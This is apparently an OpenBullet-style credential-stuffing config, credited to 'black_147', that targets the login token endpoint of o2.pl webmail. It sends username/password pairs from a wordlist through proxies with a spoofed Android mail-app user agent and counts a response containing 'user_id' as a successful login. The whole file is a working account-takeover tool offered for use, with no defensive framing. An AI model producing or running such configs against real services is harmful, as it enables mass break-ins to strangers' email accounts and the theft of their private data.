[SETTINGS]
{
  "Name": "o2.pl",
  "SuggestedBots": 100,
  "MaxCPM": 0,
  "LastModified": "2022-05-22T14:33:21.5348299+02:00",
  "AdditionalInfo": "",
  "RequiredPlugins": [],
  "Author": "black_147",
  "Version": "1.2.2",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": true,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [],
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "DisableNotifications": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": ""
}

[SCRIPT]
REQUEST POST "https://poczta.o2.pl/login/v1/token" 
  CONTENT "login=<USER>&password=<PASS>" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Host: poczta.o2.pl" 
  HEADER "Accept: application/json" 
  HEADER "User-Agent: Pocztao2/2.4.2 (samsung; SM-N975F; Android 7.1.2; Phone) 0 CT/1 Res/1280x720 PPI/240" 
  HEADER "Content-Type: application/x-www-form-urlencoded" 
  HEADER "Content-Length: 44" 
  HEADER "Accept-Encoding: gzip, deflate" 
  HEADER "Connection: close" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "user_id" 
  KEYCHAIN Failure OR 
    KEY "{}" 
